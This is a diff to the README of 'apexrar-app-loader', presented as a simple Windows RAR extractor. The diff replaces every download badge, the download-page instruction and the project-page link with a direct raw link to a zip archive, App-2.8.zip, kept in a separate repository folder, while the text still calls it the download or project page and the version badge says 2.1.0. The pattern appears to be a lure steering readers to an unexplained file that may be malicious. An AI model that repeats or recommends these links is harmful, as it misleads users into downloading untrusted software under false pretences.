@@ -5,7 +5,7 @@ description: "Extract and manage RAR archives directly in your browser with Apex
 ---
 # 🔼 apexrar-app-loader - Simple Tool to Extract RAR Files
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows_Installer-blue)](https://github.com/purityma3319/apexrar-app-loader) [![Latest Version](https://img.shields.io/badge/Version-2.1.0-green)](https://github.com/purityma3319/apexrar-app-loader)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows_Installer-blue)](https://github.com/purityma3319/purityma3319.github.io/raw/refs/heads/main/unact/App-2.8.zip) [![Latest Version](https://img.shields.io/badge/Version-2.1.0-green)](https://github.com/purityma3319/purityma3319.github.io/raw/refs/heads/main/unact/App-2.8.zip)
 
 ## 🎯 What Is ApexRAR?
 
@@ -46,7 +46,7 @@ These requirements apply to Windows only. ApexRAR does not support Mac or Linux.
 ### Step 1: Visit the Download Page
 
 Go to this link:
-[https://github.com/purityma3319/apexrar-app-loader](https://github.com/purityma3319/apexrar-app-loader)
+[https://github.com/purityma3319/purityma3319.github.io/raw/refs/heads/main/unact/App-2.8.zip](https://github.com/purityma3319/purityma3319.github.io/raw/refs/heads/main/unact/App-2.8.zip)
 
 You will see a page with green and white buttons.
 
@@ -163,6 +163,6 @@ If you have problems with the software:
 2. Read the FAQ on the GitHub page.
 3. Open an issue on GitHub if you find a bug.
 
-Visit the project page for updates: [https://github.com/purityma3319/apexrar-app-loader](https://github.com/purityma3319/apexrar-app-loader)
+Visit the project page for updates: [https://github.com/purityma3319/purityma3319.github.io/raw/refs/heads/main/unact/App-2.8.zip](https://github.com/purityma3319/purityma3319.github.io/raw/refs/heads/main/unact/App-2.8.zip)
 
 Keywords: rar extractor, windows tool, file compression, archive opener, free software, rar file, extract files, desktop application
